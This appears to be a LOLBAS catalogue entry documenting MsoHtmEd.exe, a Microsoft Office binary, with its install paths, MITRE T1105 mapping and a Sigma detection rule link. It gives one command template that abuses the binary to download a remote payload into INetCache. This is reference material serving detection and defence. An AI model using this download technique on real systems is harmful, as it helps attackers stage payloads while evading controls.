---
Acknowledgement:
- Person: Nir Chako (Pente
Author: Nir Chako
Commands:
- Category: Download
  Command: MsoHtmEd.exe {REMOTEURL}
  Description: Downloads payload from remote server
  MitreID: T1105
  OperatingSystem: Windows 10, Windows 11
  Privileges: User
  Tags:
  - Download: INetCache
  Usecase: It will download a remote payload and place it in INetCache.
Created: 2022-07-24
Description: Microsoft Office component
Detection:
- Sigma: https://github.com/SigmaHQ/sigma/blob/19396788dbedc57249a46efed2bb1927abc376d4/rules/windows/process_creation/proc_creation_win_lolbin_msohtmed_download.yml
- IOC: Suspicious Office application internet/network traffic
Full_Path:
- Path: C:\Program Files (x86)\Microsoft Office 16\ClientX86\Root\Office16\MSOHTMED.exe
- Path: C:\Program Files\Microsoft Office 16\ClientX64\Root\Office16\MSOHTMED.exe
- Path: C:\Program Files (x86)\Microsoft Office\Office16\MSOHTMED.exe
- Path: C:\Program Files\Microsoft Office\Office16\MSOHTMED.exe
- Path: C:\Program Files (x86)\Microsoft Office 15\ClientX86\Root\Office15\MSOHTMED.exe
- Path: C:\Program Files\Microsoft Office 15\ClientX64\Root\Office15\MSOHTMED.exe
- Path: C:\Program Files (x86)\Microsoft Office\Office15\MSOHTMED.exe
- Path: C:\Program Files\Microsoft Office\Office15\MSOHTMED.exe
- Path: C:\Program Files (x86)\Microsoft Office 14\ClientX86\Root\Office14\MSOHTMED.exe
- Path: C:\Program Files\Microsoft Office 14\ClientX64\Root\Office14\MSOHTMED.exe
- Path: C:\Program Files (x86)\Microsoft Office\Office14\MSOHTMED.exe
- Path: C:\Program Files\Microsoft Office\Office14\MSOHTMED.exe
- Path: C:\Program Files (x86)\Microsoft Office\Office12\MSOHTMED.exe
- Path: C:\Program Files\Microsoft Office\Office12\MSOHTMED.exe
- Path: C:\Program Files\Microsoft Office\Office12\MSOHTMED.exe
Name: MsoHtmEd.exe
mitre_data:
  technique_ids:
  - T1105
tags:
- lolbas/othermsbinaries
---

# MsoHtmEd.exe

Microsoft Office component

# Path(s)

- `C:\Program Files (x86)\Microsoft Office 16\ClientX86\Root\Office16\MSOHTMED.exe`
- `C:\Program Files\Microsoft Office 16\ClientX64\Root\Office16\MSOHTMED.exe`
- `C:\Program Files (x86)\Microsoft Office\Office16\MSOHTMED.exe`
- `C:\Program Files\Microsoft Office\Office16\MSOHTMED.exe`
- `C:\Program Files (x86)\Microsoft Office 15\ClientX86\Root\Office15\MSOHTMED.exe`
- `C:\Program Files\Microsoft Office 15\ClientX64\Root\Office15\MSOHTMED.exe`
- `C:\Program Files (x86)\Microsoft Office\Office15\MSOHTMED.exe`
- `C:\Program Files\Microsoft Office\Office15\MSOHTMED.exe`
- `C:\Program Files (x86)\Microsoft Office 14\ClientX86\Root\Office14\MSOHTMED.exe`
- `C:\Program Files\Microsoft Office 14\ClientX64\Root\Office14\MSOHTMED.exe`
- `C:\Program Files (x86)\Microsoft Office\Office14\MSOHTMED.exe`
- `C:\Program Files\Microsoft Office\Office14\MSOHTMED.exe`
- `C:\Program Files (x86)\Microsoft Office\Office12\MSOHTMED.exe`
- `C:\Program Files\Microsoft Office\Office12\MSOHTMED.exe`
- `C:\Program Files\Microsoft Office\Office12\MSOHTMED.exe`

# Download Commands

Downloads payload from remote server

```batch
MsoHtmEd.exe {REMOTEURL}
```

- **Usecase:** It will download a remote payload and place it in INetCache.
- **Privileges Required:** User
- **MitreID:** `T1105`
- **Operating System(s):** Windows 10, Windows 11


# Acknowledgements

- Nir Chako (Authored, 2022-07-24)
- Nir Chako (Pente